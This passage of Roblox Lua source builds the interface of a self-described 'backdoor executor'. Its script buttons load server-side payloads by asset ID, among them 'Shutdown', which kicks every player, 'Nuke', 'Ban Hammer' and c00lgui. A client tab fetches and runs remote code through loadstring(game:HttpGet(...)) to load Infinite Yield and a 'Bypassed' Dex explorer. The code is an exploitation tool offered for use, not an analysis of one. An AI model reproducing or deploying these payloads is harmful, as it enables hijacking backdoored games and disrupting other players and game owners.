Converted["_ExecStroke"].Parent=Converted["_ExecBtn"]
Converted["_ExecImg"].Size=UDim2.new(0,26,0,26)
Converted["_ExecImg"].Position=UDim2.new(0.5,-13,0.5,-13)
Converted["_ExecImg"].BackgroundTransparency=1
Converted["_ExecImg"].Image="rbxthumb://type=Asset&id=125932388957550&w=150&h=150"
Converted["_ExecImg"].Parent=Converted["_ExecBtn"]
Converted["_ClearBtn"].Size=UDim2.new(0,42,0,36)
Converted["_ClearBtn"].Position=UDim2.new(0,46,0,0)
Converted["_ClearBtn"].BackgroundTransparency=1
Converted["_ClearBtn"].Text=""
Converted["_ClearBtn"].AutoButtonColor=false
Converted["_ClearBtn"].Parent=Converted["_BottomBar"]
Converted["_ClearCorner"].CornerRadius=UDim.new(0,6)
Converted["_ClearCorner"].Parent=Converted["_ClearBtn"]
Converted["_ClearStroke"].ApplyStrokeMode=Enum.ApplyStrokeMode.Border
Converted["_ClearStroke"].Color=Color3.fromRGB(150,150,150)
Converted["_ClearStroke"].Thickness=1
Converted["_ClearStroke"].Transparency=0.5
Converted["_ClearStroke"].Parent=Converted["_ClearBtn"]
Converted["_ClearImg"].Size=UDim2.new(0,26,0,26)
Converted["_ClearImg"].Position=UDim2.new(0.5,-13,0.5,-13)
Converted["_ClearImg"].BackgroundTransparency=1
Converted["_ClearImg"].Image="rbxthumb://type=Asset&id=133839766903279&w=150&h=150"
Converted["_ClearImg"].Parent=Converted["_ClearBtn"]
Converted["_R6Btn"].Size=UDim2.new(0,42,0,36)
Converted["_R6Btn"].Position=UDim2.new(0,92,0,0)
Converted["_R6Btn"].BackgroundTransparency=1
Converted["_R6Btn"].Text="R6"
Converted["_R6Btn"].TextColor3=Color3.fromRGB(255,255,255)
Converted["_R6Btn"].TextSize=14
Converted["_R6Btn"].Font=Enum.Font.GothamBold
Converted["_R6Btn"].AutoButtonColor=false
Converted["_R6Btn"].Parent=Converted["_BottomBar"]
Converted["_R6Corner"].CornerRadius=UDim.new(0,6)
Converted["_R6Corner"].Parent=Converted["_R6Btn"]
Converted["_R6Stroke"].ApplyStrokeMode=Enum.ApplyStrokeMode.Border
Converted["_R6Stroke"].Color=Color3.fromRGB(150,150,150)
Converted["_R6Stroke"].Thickness=1
Converted["_R6Stroke"].Transparency=0.5
Converted["_R6Stroke"].Parent=Converted["_R6Btn"]
Converted["_ReBtn"].Size=UDim2.new(0,42,0,36)
Converted["_ReBtn"].Position=UDim2.new(0,138,0,0)
Converted["_ReBtn"].BackgroundTransparency=1
Converted["_ReBtn"].Text="RE"
Converted["_ReBtn"].TextColor3=Color3.fromRGB(255,255,255)
Converted["_ReBtn"].TextSize=14
Converted["_ReBtn"].Font=Enum.Font.GothamBold
Converted["_ReBtn"].AutoButtonColor=false
Converted["_ReBtn"].Parent=Converted["_BottomBar"]
Converted["_ReCorner"].CornerRadius=UDim.new(0,6)
Converted["_ReCorner"].Parent=Converted["_ReBtn"]
Converted["_ReStroke"].ApplyStrokeMode=Enum.ApplyStrokeMode.Border
Converted["_ReStroke"].Color=Color3.fromRGB(150,150,150)
Converted["_ReStroke"].Thickness=1
Converted["_ReStroke"].Transparency=0.5
Converted["_ReStroke"].Parent=Converted["_ReBtn"]
Converted["_CopyBtn"].Size=UDim2.new(0,42,0,36)
Converted["_CopyBtn"].Position=UDim2.new(1,-102,0,0)
Converted["_CopyBtn"].BackgroundTransparency=1
Converted["_CopyBtn"].Text=""
Converted["_CopyBtn"].AutoButtonColor=false
Converted["_CopyBtn"].Parent=Converted["_BottomBar"]
Converted["_CopyCorner"].CornerRadius=UDim.new(0,6)
Converted["_CopyCorner"].Parent=Converted["_CopyBtn"]
Converted["_CopyStroke"].ApplyStrokeMode=Enum.ApplyStrokeMode.Border
Converted["_CopyStroke"].Color=Color3.fromRGB(150,150,150)
Converted["_CopyStroke"].Thickness=1
Converted["_CopyStroke"].Transparency=0.5
Converted["_CopyStroke"].Parent=Converted["_CopyBtn"]
Converted["_CopyImg"].Size=UDim2.new(0,26,0,26)
Converted["_CopyImg"].Position=UDim2.new(0.5,-13,0.5,-13)
Converted["_CopyImg"].BackgroundTransparency=1
Converted["_CopyImg"].Image="rbxthumb://type=Asset&id=11833749538&w=150&h=150"
Converted["_CopyImg"].Parent=Converted["_CopyBtn"]
Converted["_ScanBtn"].Size=UDim2.new(0,56,0,36)
Converted["_ScanBtn"].Position=UDim2.new(1,-56,0,0)
Converted["_ScanBtn"].BackgroundTransparency=1
Converted["_ScanBtn"].Text="Scan"
Converted["_ScanBtn"].TextColor3=Color3.fromRGB(255,255,255)
Converted["_ScanBtn"].TextSize=14
Converted["_ScanBtn"].Font=Enum.Font.GothamBold
Converted["_ScanBtn"].AutoButtonColor=false
Converted["_ScanBtn"].Parent=Converted["_BottomBar"]
Converted["_ScanCorner"].CornerRadius=UDim.new(0,6)
Converted["_ScanCorner"].Parent=Converted["_ScanBtn"]
Converted["_ScanStroke"].ApplyStrokeMode=Enum.ApplyStrokeMode.Border
Converted["_ScanStroke"].Color=Color3.fromRGB(150,150,150)
Converted["_ScanStroke"].Thickness=1
Converted["_ScanStroke"].Transparency=0.5
Converted["_ScanStroke"].Parent=Converted["_ScanBtn"]
Converted["_ScanImg"].Size=UDim2.new(0,26,0,26)
Converted["_ScanImg"].Position=UDim2.new(0.5,-13,0.5,-13)
Converted["_ScanImg"].BackgroundTransparency=1
Converted["_ScanImg"].Image="rbxthumb://type=Asset&id=6728155886&w=150&h=150"
Converted["_ScanImg"].Visible=false
Converted["_ScriptsContent"].Size=UDim2.new(1,0,1,0)
Converted["_ScriptsContent"].BackgroundTransparency=1
Converted["_ScriptsContent"].Visible=false
Converted["_ScriptsContent"].Parent=Converted["_ContentArea"]
Converted["_ScriptsLabel"].Size=UDim2.new(1,-24,0,30)
Converted["_ScriptsLabel"].Position=UDim2.new(0,12,0,8)
Converted["_ScriptsLabel"].BackgroundTransparency=1
Converted["_ScriptsLabel"].Text="Scripts"
Converted["_ScriptsLabel"].TextColor3=Color3.fromRGB(255,255,255)
Converted["_ScriptsLabel"].TextSize=18
Converted["_ScriptsLabel"].Font=Enum.Font.GothamBold
Converted["_ScriptsLabel"].TextXAlignment=Enum.TextXAlignment.Left
Converted["_ScriptsLabel"].Parent=Converted["_ScriptsContent"]
Converted["_MoreSoonLabel"].Size=UDim2.new(1,-24,0,60)
Converted["_MoreSoonLabel"].Position=UDim2.new(0,12,0,100)
Converted["_MoreSoonLabel"].BackgroundTransparency=1
Converted["_MoreSoonLabel"].Text="More scripts soon!"
Converted["_MoreSoonLabel"].TextColor3=Color3.fromRGB(255,255,255)
Converted["_MoreSoonLabel"].TextSize=22
Converted["_MoreSoonLabel"].Font=Enum.Font.GothamBold
Converted["_MoreSoonLabel"].TextXAlignment=Enum.TextXAlignment.Center
Converted["_MoreSoonLabel"].TextYAlignment=Enum.TextYAlignment.Center
Converted["_MoreSoonLabel"].Visible=false
Converted["_MoreSoonLabel"].Parent=Converted["_ScriptsContent"]

local AllContent = Instance.new("ScrollingFrame")
AllContent.Name = "AllContent"
AllContent.Size = UDim2.new(1,-24,1,-122)
AllContent.Position = UDim2.new(0,12,0,80)
AllContent.BackgroundTransparency = 1
AllContent.BorderSizePixel = 0
AllContent.ScrollBarThickness = 6
AllContent.ScrollBarImageColor3 = Color3.fromRGB(180,180,180)
AllContent.ScrollingDirection = Enum.ScrollingDirection.Y
AllContent.ScrollingEnabled = true
AllContent.Active = true
AllContent.ClipsDescendants = true
AllContent.CanvasSize = UDim2.new(0,0,0,0)
AllContent.AutomaticCanvasSize = Enum.AutomaticSize.Y
AllContent.ElasticBehavior = Enum.ElasticBehavior.Never
AllContent.Parent = Converted["_ScriptsContent"]

local AllLayout = Instance.new("UIGridLayout")
AllLayout.CellSize = UDim2.new(0, 120, 0, 32)
AllLayout.CellPadding = UDim2.new(0, 14, 0, 14)
AllLayout.SortOrder = Enum.SortOrder.LayoutOrder
AllLayout.FillDirection = Enum.FillDirection.Horizontal
AllLayout.FillDirectionMaxCells = 3
AllLayout.HorizontalAlignment = Enum.HorizontalAlignment.Left
AllLayout.VerticalAlignment = Enum.VerticalAlignment.Top
AllLayout.Parent = AllContent

local AllPadding = Instance.new("UIPadding")
AllPadding.PaddingTop = UDim.new(0, 6)
AllPadding.PaddingBottom = UDim.new(0, 30)
AllPadding.PaddingLeft = UDim.new(0, 8)
AllPadding.PaddingRight = UDim.new(0, 8)
AllPadding.Parent = AllContent

local MorphContent = Instance.new("ScrollingFrame")
MorphContent.Name = "MorphContent"
MorphContent.Size = UDim2.new(1,-24,1,-122)
MorphContent.Position = UDim2.new(0,12,0,80)
MorphContent.BackgroundTransparency = 1
MorphContent.BorderSizePixel = 0
MorphContent.ScrollBarThickness = 6
MorphContent.ScrollBarImageColor3 = Color3.fromRGB(180,180,180)
MorphContent.ScrollingDirection = Enum.ScrollingDirection.Y
MorphContent.ScrollingEnabled = true
MorphContent.Active = true
MorphContent.ClipsDescendants = true
MorphContent.CanvasSize = UDim2.new(0,0,0,0)
MorphContent.AutomaticCanvasSize = Enum.AutomaticSize.Y
MorphContent.ElasticBehavior = Enum.ElasticBehavior.Never
MorphContent.Visible = false
MorphContent.Parent = Converted["_ScriptsContent"]

local MorphLayout = Instance.new("UIGridLayout")
MorphLayout.CellSize = UDim2.new(0, 120, 0, 32)
MorphLayout.CellPadding = UDim2.new(0, 14, 0, 14)
MorphLayout.SortOrder = Enum.SortOrder.LayoutOrder
MorphLayout.FillDirection = Enum.FillDirection.Horizontal
MorphLayout.FillDirectionMaxCells = 3
MorphLayout.HorizontalAlignment = Enum.HorizontalAlignment.Left
MorphLayout.VerticalAlignment = Enum.VerticalAlignment.Top
MorphLayout.Parent = MorphContent

local MorphPadding = Instance.new("UIPadding")
MorphPadding.PaddingTop = UDim.new(0, 6)
MorphPadding.PaddingLeft = UDim.new(0, 8)
MorphPadding.PaddingRight = UDim.new(0, 8)
MorphPadding.Parent = MorphContent

local DestroyContent = Instance.new("ScrollingFrame")
DestroyContent.Name = "DestroyContent"
DestroyContent.Size = UDim2.new(1,-24,1,-122)
DestroyContent.Position = UDim2.new(0,12,0,80)
DestroyContent.BackgroundTransparency = 1
DestroyContent.BorderSizePixel = 0
DestroyContent.ScrollBarThickness = 6
DestroyContent.ScrollBarImageColor3 = Color3.fromRGB(180,180,180)
DestroyContent.ScrollingDirection = Enum.ScrollingDirection.Y
DestroyContent.ScrollingEnabled = true
DestroyContent.Active = true
DestroyContent.ClipsDescendants = true
DestroyContent.CanvasSize = UDim2.new(0,0,0,0)
DestroyContent.AutomaticCanvasSize = Enum.AutomaticSize.Y
DestroyContent.ElasticBehavior = Enum.ElasticBehavior.Never
DestroyContent.Visible = false
DestroyContent.Parent = Converted["_ScriptsContent"]

local DestroyLayout = Instance.new("UIGridLayout")
DestroyLayout.CellSize = UDim2.new(0, 120, 0, 32)
DestroyLayout.CellPadding = UDim2.new(0, 14, 0, 14)
DestroyLayout.SortOrder = Enum.SortOrder.LayoutOrder
DestroyLayout.FillDirection = Enum.FillDirection.Horizontal
DestroyLayout.FillDirectionMaxCells = 3
DestroyLayout.HorizontalAlignment = Enum.HorizontalAlignment.Left
DestroyLayout.VerticalAlignment = Enum.VerticalAlignment.Top
DestroyLayout.Parent = DestroyContent

local DestroyPadding = Instance.new("UIPadding")
DestroyPadding.PaddingTop = UDim.new(0, 6)
DestroyPadding.PaddingLeft = UDim.new(0, 8)
DestroyPadding.PaddingRight = UDim.new(0, 8)
DestroyPadding.Parent = DestroyContent

local ClientContent = Instance.new("ScrollingFrame")
ClientContent.Name = "ClientContent"
ClientContent.Size = UDim2.new(1,-24,1,-122)
ClientContent.Position = UDim2.new(0,12,0,80)
ClientContent.BackgroundTransparency = 1
ClientContent.BorderSizePixel = 0
ClientContent.ScrollBarThickness = 6
ClientContent.ScrollBarImageColor3 = Color3.fromRGB(180,180,180)
ClientContent.ScrollingDirection = Enum.ScrollingDirection.Y
ClientContent.ScrollingEnabled = true
ClientContent.Active = true
ClientContent.ClipsDescendants = true
ClientContent.CanvasSize = UDim2.new(0,0,0,0)
ClientContent.AutomaticCanvasSize = Enum.AutomaticSize.Y
ClientContent.ElasticBehavior = Enum.ElasticBehavior.Never
ClientContent.Visible = false
ClientContent.Parent = Converted["_ScriptsContent"]

local ClientLayout = Instance.new("UIGridLayout")
ClientLayout.CellSize = UDim2.new(0, 120, 0, 32)
ClientLayout.CellPadding = UDim2.new(0, 14, 0, 14)
ClientLayout.SortOrder = Enum.SortOrder.LayoutOrder
ClientLayout.FillDirection = Enum.FillDirection.Horizontal
ClientLayout.FillDirectionMaxCells = 3
ClientLayout.HorizontalAlignment = Enum.HorizontalAlignment.Left
ClientLayout.VerticalAlignment = Enum.VerticalAlignment.Top
ClientLayout.Parent = ClientContent

local ClientPadding = Instance.new("UIPadding")
ClientPadding.PaddingTop = UDim.new(0, 6)
ClientPadding.PaddingLeft = UDim.new(0, 8)
ClientPadding.PaddingRight = UDim.new(0, 8)
ClientPadding.Parent = ClientContent

local ScriptBtns = {}
local function makeScriptBtn(parent, key, label, code, order)
	local btn = Instance.new("TextButton")
	btn.Name = key.."Btn"
	btn.Size = UDim2.new(0,120,0,32)
	btn.BackgroundColor3 = Color3.fromRGB(16,16,16)
	btn.BackgroundTransparency = 0
	btn.Text = label
	btn.TextColor3 = Color3.fromRGB(255,255,255)
	btn.TextSize = 12
	btn.Font = Enum.Font.GothamBold
	btn.AutoButtonColor = false
	btn.BorderSizePixel = 0
	btn.TextTruncate = Enum.TextTruncate.AtEnd
	btn.LayoutOrder = order
	btn.Parent = parent
	local c = Instance.new("UICorner"); c.CornerRadius = UDim.new(0,6); c.Parent = btn
	local s = Instance.new("UIStroke"); s.ApplyStrokeMode = Enum.ApplyStrokeMode.Border; s.Color = Color3.fromRGB(57,57,57); s.Thickness = 1.5; s.Transparency = 0; s.Parent = btn
	ScriptBtns[key] = {button=btn, label=label, code=code, stroke=s}
	return btn
end

makeScriptBtn(AllContent, "All_Aureus", "Aureus", 'require(6036737823).CrackedByIncreaseron("'..player.Name..'")', 1)
makeScriptBtn(AllContent, "All_AquaHub", "Aqua Hub", 'require(5099140412).Aqua("'..player.Name..'")', 2)
makeScriptBtn(AllContent, "All_Sensation", "Sensation", 'require(82303184140990)("'..player.Name..'")', 3)
makeScriptBtn(AllContent, "All_C00lgui", "C00lgui", 'require(14125553864):Fire("'..player.Name..'","c00lkidd")', 4)
makeScriptBtn(AllContent, "All_H4rdcore", "H4RDC0RE GUI", 'require(123658588155703).HxC("'..player.Name..'")', 5)
makeScriptBtn(AllContent, "All_Happyhub", "HappyHub SS", 'require(104239303577263):Hload("'..player.Name..'")', 6)
makeScriptBtn(AllContent, "All_Banhammer", "Ban Hammer (R6)", 'require(5448035802).Hammer("'..player.Name..'","BanHammer")', 7)
makeScriptBtn(AllContent, "All_Shutdown", "Shutdown", 'for _, player in pairs(game.Players:GetPlayers()) do player:Kick("The server has shutdown.") end', 8)
makeScriptBtn(AllContent, "All_Trash", "Trash Hub", 'require(17182254638)("'..player.Name..'")', 9)
makeScriptBtn(AllContent, "All_C4", "C4", 'require(0x1767bf813)("'..player.Name..'")', 10)
makeScriptBtn(AllContent, "All_Blackhole", "Blackhole", 'require(123962936012591).name("'..player.Name..'")', 11)
makeScriptBtn(AllContent, "All_Nuke", "Nuke", 'require(13035544140).nuke("'..player.Name..'")', 12)
makeScriptBtn(AllContent, "All_NootNoot", "NOOT NOOT", 'require(5034863407).subtosyntax64("'..player.Name..'")', 13)
makeScriptBtn(AllContent, "All_InstantNuke", "Instant Nuke", 'require(4178274460).Nuke(Vector3.new("'..player.Name..'"),1000)', 14)
makeScriptBtn(AllContent, "All_GONER", "GONER (R6)", 'require(4513235536).G("'..player.Name..'")', 15)
makeScriptBtn(AllContent, "All_Sledge", "Sledge Hammer (R6)", 'require(8038037940).CLoad("'..player.Name..'")', 16)
makeScriptBtn(AllContent, "All_Sans", "Sans (R6)", 'require(4952709475).load("'..player.Name..'")', 17)
makeScriptBtn(AllContent, "All_LostSoul", "Lost Soul (R6)", 'require(5390158029).Dark("'..player.Name..'")', 18)
makeScriptBtn(AllContent, "All_Sunshine", "Sunshine", 'require(138804259262741).ProjectSunshine("'..player.Name..'")', 19)
makeScriptBtn(AllContent, "All_EpicHint", "Epic Hint", 'local h=Instance.new("Hint") h.Parent=workspace h.Text="Epic Backdoor Executor | The Best Backdoor Executor!" wait(5) h:Destroy()', 20)
makeScriptBtn(AllContent, "All_F3MBOY", "F3MBOY", 'require(72673703107622).F3MBOY("'..player.Name..'")', 21)

makeScriptBtn(MorphContent, "Morph_GONER", "GONER (R6)", 'require(4513235536).G("'..player.Name..'")', 1)
makeScriptBtn(MorphContent, "Morph_Sans", "Sans (R6)", 'require(4952709475).load("'..player.Name..'")', 2)
makeScriptBtn(MorphContent, "Morph_LostSoul", "Lost Soul (R6)", 'require(5390158029).Dark("'..player.Name..'")', 3)

makeScriptBtn(DestroyContent, "Destroy_Shutdown", "Shutdown", 'for _, player in pairs(game.Players:GetPlayers()) do player:Kick("The server has shutdown.") end', 1)
makeScriptBtn(DestroyContent, "Destroy_NootNoot", "NOOT NOOT", 'require(5034863407).subtosyntax64("'..player.Name..'")', 2)
makeScriptBtn(DestroyContent, "Destroy_Nuke", "Nuke", 'require(13035544140).nuke("'..player.Name..'")', 3)
makeScriptBtn(DestroyContent, "Destroy_InstantNuke", "Instant Nuke", 'require(4178274460).Nuke(Vector3.new("'..player.Name..'"),1000)', 4)
makeScriptBtn(DestroyContent, "Destroy_Blackhole", "Blackhole", 'require(123962936012591).name("'..player.Name..'")', 5)
makeScriptBtn(DestroyContent, "Destroy_Sledge", "Sledge Hammer (R6)", 'require(8038037940).CLoad("'..player.Name..'")', 6)

makeScriptBtn(ClientContent, "InfiniteYield", "Infinite Yield", 'loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()', 1)
makeScriptBtn(ClientContent, "DexExplorer", "Dex Explorer", 'loadstring(game:HttpGet("https://raw.githubusercontent.com/Babyhamsta/RBLX_Scripts/main/Universal/BypassedDarkDexV3.lua"))()', 2)

local CategoryFrame = Instance.new("Frame")
CategoryFrame.Name = "CategoryFrame"
CategoryFrame.Size = UDim2.new(1,-24,0,28)
CategoryFrame.Position = UDim2.new(0,12,0,42)
CategoryFrame.BackgroundTransparency = 1
CategoryFrame.Parent = Converted["_ScriptsContent"]

local function styleCatBtn(btn, label, x, w)
	btn.Size = UDim2.new(0,w,0,24)
	btn.Position = UDim2.new(0,x,0,2)
	btn.BackgroundColor3 = Color3.fromRGB(16,16,16)
	btn.BackgroundTransparency = 0
	btn.Text = label
	btn.TextColor3 = Color3.fromRGB(255,255,255)
	btn.TextSize = 12
	btn.Font = Enum.Font.GothamBold
	btn.AutoButtonColor = false
	btn.BorderSizePixel = 0
	btn.Parent = CategoryFrame
	local c = Instance.new("UICorner"); c.CornerRadius = UDim.new(0,6); c.Parent = btn
	local s = Instance.new("UIStroke"); s.ApplyStrokeMode = Enum.ApplyStrokeMode.Border; s.Color = Color3.fromRGB(57,57,57); s.Thickness = 1.5; s.Transparency = 0; s.Parent = btn
end

local AllTabBtn = Instance.new("TextButton")
local MorphTabBtn = Instance.new("TextButton")
local DestroyTabBtn = Instance.new("TextButton")
local ClientTabBtn = Instance.new("TextButton")

styleCatBtn(AllTabBtn, "All", 0, 55)
styleCatBtn(MorphTabBtn, "Morph", 62, 70)
styleCatBtn(DestroyTabBtn, "Destroy", 139, 78)
styleCatBtn(ClientTabBtn, "Client", 0, 65)

Converted["_SearchBg"].Name="SearchBg"
Converted["_SearchBg"].Size=UDim2.new(0,180,0,24)
Converted["_SearchBg"].Position=UDim2.new(1,-188,0,2)
Converted["_SearchBg"].BackgroundColor3=Color3.fromRGB(15,15,15)
Converted["_SearchBg"].BackgroundTransparency=0
Converted["_SearchBg"].BorderSizePixel=0
Converted["_SearchBg"].Parent=CategoryFrame
Converted["_SearchCorner"].CornerRadius=UDim.new(0,6)
Converted["_SearchCorner"].Parent=Converted["_SearchBg"]
Converted["_SearchStroke"].ApplyStrokeMode=Enum.ApplyStrokeMode.Border
Converted["_SearchStroke"].Color=Color3.fromRGB(80,80,80)
Converted["_SearchStroke"].Thickness=1.5
Converted["_SearchStroke"].Transparency=0
Converted["_SearchStroke"].Parent=Converted["_SearchBg"]

Converted["_SearchInput"].Name="SearchInput"
Converted["_SearchInput"].Size=UDim2.new(1,-14,1,0)
Converted["_SearchInput"].Position=UDim2.new(0,7,0,0)
Converted["_SearchInput"].BackgroundTransparency=1
Converted["_SearchInput"].Text=""
Converted["_SearchInput"].PlaceholderText="Search scripts..."
Converted["_SearchInput"].PlaceholderColor3=Color3.fromRGB(130,130,130)
Converted["_SearchInput"].TextColor3=Color3.fromRGB(255,255,255)
Converted["_SearchInput"].TextSize=12
Converted["_SearchInput"].Font=Enum.Font.Gotham
Converted["_SearchInput"].TextXAlignment=Enum.TextXAlignment.Left
Converted["_SearchInput"].ClearTextOnFocus=false
Converted["_SearchInput"].Parent=Converted["_SearchBg"]

local currentCategory = "All"

local function getHubColors()
	if currentTheme=="purple" then
		return {
			btnBg        = Color3.fromRGB(30,12,45),
			btnHover     = Color3.fromRGB(48,22,68),
			btnPress     = Color3.fromRGB(22,8,35),
			btnStroke    = Color3.fromRGB(90,40,140),
			btnStrokeHov = Color3.fromRGB(180,80,255),
			btnStrokePrs = Color3.fromRGB(70,30,110),
			tabActive    = Color3.fromRGB(180,80,255),
			tabActiveSt  = Color3.fromRGB(255,255,255),
			tabActiveTx  = Color3.fromRGB(255,255,255),
			tabInactive  = Color3.fromRGB(30,12,45),
			tabInactSt   = Color3.fromRGB(90,40,140),
			tabInactTx   = Color3.fromRGB(200,170,220),
			searchBg     = Color3.fromRGB(20,8,32),
			searchSt     = Color3.fromRGB(120,50,180),
			searchPh     = Color3.fromRGB(140,100,170),
		}
	else
		return {
			btnBg        = Color3.fromRGB(16,16,16),
			btnHover     = Color3.fromRGB(22,22,22),
			btnPress     = Color3.fromRGB(10,10,10),
			btnStroke    = Color3.fromRGB(57,57,57),
			btnStrokeHov = Color3.fromRGB(65,65,65),
			btnStrokePrs = Color3.fromRGB(50,50,50),
			tabActive    = Color3.fromRGB(255,255,255),
			tabActiveSt  = Color3.fromRGB(255,255,255),
			tabActiveTx  = Color3.fromRGB(0,0,0),
			tabInactive  = Color3.fromRGB(16,16,16),
			tabInactSt   = Color3.fromRGB(57,57,57),
			tabInactTx   = Color3.fromRGB(255,255,255),
			searchBg     = Color3.fromRGB(15,15,15),
			searchSt     = Color3.fromRGB(80,80,80),
			searchPh     = Color3.fromRGB(130,130,130),
		}
	end
end

local function setActiveCat(btn, active)
	local C = getHubColors()
	if active then
		btn.BackgroundTransparency = 0
		btn.BackgroundColor3 = C.tabActive
		btn.TextColor3 = C.tabActiveTx
		local s = btn:FindFirstChildOfClass("UIStroke")
		if s then s.Color = C.tabActiveSt end
	else
		btn.BackgroundTransparency = 0
		btn.BackgroundColor3 = C.tabInactive
		btn.TextColor3 = C.tabInactTx
		local s = btn:FindFirstChildOfClass("UIStroke")
		if s then s.Color = C.tabInactSt end
	end
end

local function refreshHubColors()
	local C = getHubColors()
	for _, data in pairs(ScriptBtns) do
		if data.button and data.button.Parent then
			data.button.BackgroundColor3 = C.btnBg
			if data.stroke then data.stroke.Color = C.btnStroke end
		end
	end
	Converted["_SearchBg"].BackgroundColor3 = C.searchBg
	Converted["_SearchStroke"].Color = C.searchSt
	Converted["_SearchInput"].PlaceholderColor3 = C.searchPh

	if execMode == "C" then
		AllTabBtn.Visible = false
		MorphTabBtn.Visible = false
		DestroyTabBtn.Visible = false
		ClientTabBtn.Visible = true
		AllContent.Visible = false
		MorphContent.Visible = false
		DestroyContent.Visible = false
		ClientContent.Visible = true
		setActiveCat(ClientTabBtn, true)
	else
		AllTabBtn.Visible = true
		MorphTabBtn.Visible = true
		DestroyTabBtn.Visible = true
		ClientTabBtn.Visible = false
		AllContent.Visible = currentCategory == "All"
		MorphContent.Visible = currentCategory == "Morph"
		DestroyContent.Visible = currentCategory == "Destroy"
		ClientContent.Visible = false
		setActiveCat(AllTabBtn, currentCategory == "All")
		setActiveCat(MorphTabBtn, currentCategory == "Morph")
		setActiveCat(DestroyTabBtn, currentCategory == "Destroy")
	end
end

local function updateCategoryTabs()
	AllTabBtn.Position = UDim2.new(0,0,0,2)
	AllTabBtn.Size = UDim2.new(0,55,0,24)
	MorphTabBtn.Position = UDim2.new(0,62,0,2)
	MorphTabBtn.Size = UDim2.new(0,70,0,24)
	DestroyTabBtn.Position = UDim2.new(0,139,0,2)
	DestroyTabBtn.Size = UDim2.new(0,78,0,24)
	ClientTabBtn.Position = UDim2.new(0,0,0,2)
	ClientTabBtn.Size = UDim2.new(0,65,0,24)
	refreshHubColors()
end

local function filterScripts(text)
	text = text:lower()
	for key, data in pairs(ScriptBtns) do
		if text == "" then
			data.button.Visible = true
		else
			data.button.Visible = data.label:lower():find(text, 1, true) ~= nil
		end
	end
end

Converted["_SearchInput"]:GetPropertyChangedSignal("Text"):Connect(function()
	filterScripts(Converted["_SearchInput"].Text)
end)

local function switchCategory(cat)
	currentCategory = cat
	updateCategoryTabs()
	filterScripts(Converted["_SearchInput"].Text)
end

AllTabBtn.MouseButton1Click:Connect(function() switchCategory("All") end)
MorphTabBtn.MouseButton1Click:Connect(function() switchCategory("Morph") end)
DestroyTabBtn.MouseButton1Click:Connect(function() switchCategory("Destroy") end)

Converted["_SettingsContent"].Size=UDim2.new(1,0,1,0)
Converted["_SettingsContent"].BackgroundTransparency=1
Converted["_SettingsContent"].Visible=false
Converted["_SettingsContent"].BorderSizePixel=0
Converted["_SettingsContent"].ScrollBarThickness=6
Converted["_SettingsContent"].ScrollBarImageColor3=Color3.fromRGB(150,150,150)
Converted["_SettingsContent"].CanvasSize=UDim2.new(0,0,0,850)
Converted["_SettingsContent"].Parent=Converted["_ContentArea"]

Converted["_SettingsLabel"].Size=UDim2.new(1,-24,0,30)
Converted["_SettingsLabel"].Position=UDim2.new(0,12,0,8)
Converted["_SettingsLabel"].BackgroundTransparency=1
Converted["_SettingsLabel"].Text="Settings"
Converted["_SettingsLabel"].TextColor3=Color3.fromRGB(255,255,255)
Converted["_SettingsLabel"].TextSize=18
Converted["_SettingsLabel"].Font=Enum.Font.GothamBold
Converted["_SettingsLabel"].TextXAlignment=Enum.TextXAlignment.Left
Converted["_SettingsLabel"].Parent=Converted["_SettingsContent"]

Converted["_LogsLabel"].Size=UDim2.new(0,100,0,22)
Converted["_LogsLabel"].Position=UDim2.new(0,30,0,50)
Converted["_LogsLabel"].BackgroundTransparency=1
Converted["_LogsLabel"].Text="Logs"
Converted["_LogsLabel"].TextColor3=Color3.fromRGB(255,255,255)
Converted["_LogsLabel"].TextSize=15
Converted["_LogsLabel"].Font=Enum.Font.GothamBold
Converted["_LogsLabel"].TextXAlignment=Enum.TextXAlignment.Left
Converted["_LogsLabel"].Parent=Converted["_SettingsContent"]

Converted["_LogsCount"].Size=UDim2.new(0,80,0,22)
Converted["_LogsCount"].Position=UDim2.new(0,132,0,50)
Converted["_LogsCount"].BackgroundTransparency=1
Converted["_LogsCount"].Text="0 lines"
Converted["_LogsCount"].TextColor3=Color3.fromRGB(140,140,140)
Converted["_LogsCount"].TextSize=11
Converted["_LogsCount"].Font=Enum.Font.Gotham
Converted["_LogsCount"].TextXAlignment=Enum.TextXAlignment.Left
Converted["_LogsCount"].Parent=Converted["_SettingsContent"]

Converted["_LogsCopyBtn"].Size=UDim2.new(0,66,0,22)
Converted["_LogsCopyBtn"].Position=UDim2.new(1,-76,0,50)
Converted["_LogsCopyBtn"].BackgroundColor3=Color3.fromRGB(0,0,0)
Converted["_LogsCopyBtn"].BackgroundTransparency=0
Converted["_LogsCopyBtn"].Text="COPY"
Converted["_LogsCopyBtn"].TextColor3=Color3.fromRGB(255,255,255)
Converted["_LogsCopyBtn"].TextSize=11
Converted["_LogsCopyBtn"].Font=Enum.Font.GothamBold
Converted["_LogsCopyBtn"].AutoButtonColor=false
Converted["_LogsCopyBtn"].BorderSizePixel=0
Converted["_LogsCopyBtn"].Parent=Converted["_SettingsContent"]
Converted["_LogsCopyCorner"].CornerRadius=UDim.new(0,6)
Converted["_LogsCopyCorner"].Parent=Converted["_LogsCopyBtn"]
Converted["_LogsCopyStroke"].ApplyStrokeMode=Enum.ApplyStrokeMode.Border
Converted["_LogsCopyStroke"].Color=Color3.fromRGB(255,255,255)
Converted["_LogsCopyStroke"].Thickness=1.2
Converted["_LogsCopyStroke"].Transparency=0
Converted["_LogsCopyStroke"].Parent=Converted["_LogsCopyBtn"]

Converted["_LogsClearBtn"].Size=UDim2.new(0,66,0,22)
Converted["_LogsClearBtn"].Position=UDim2.new(1,-148,0,50)
Converted["_LogsClearBtn"].BackgroundColor3=Color3.fromRGB(0,0,0)
Converted["_LogsClearBtn"].BackgroundTransparency=0
Converted["_LogsClearBtn"].Text="CLEAR"
Converted["_LogsClearBtn"].TextColor3=Color3.fromRGB(255,120,120)
Converted["_LogsClearBtn"].TextSize=11
Converted["_LogsClearBtn"].Font=Enum.Font.GothamBold
Converted["_LogsClearBtn"].AutoButtonColor=false
Converted["_LogsClearBtn"].BorderSizePixel=0
Converted["_LogsClearBtn"].Parent=Converted["_SettingsContent"]
Converted["_LogsClearCorner"].CornerRadius=UDim.new(0,6)
Converted["_LogsClearCorner"].Parent=Converted["_LogsClearBtn"]
Converted["_LogsClearStroke"].ApplyStrokeMode=Enum.ApplyStrokeMode.Border
Converted["_LogsClearStroke"].Color=Color3.fromRGB(200,70,70)
Converted["_LogsClearStroke"].Thickness=1.2
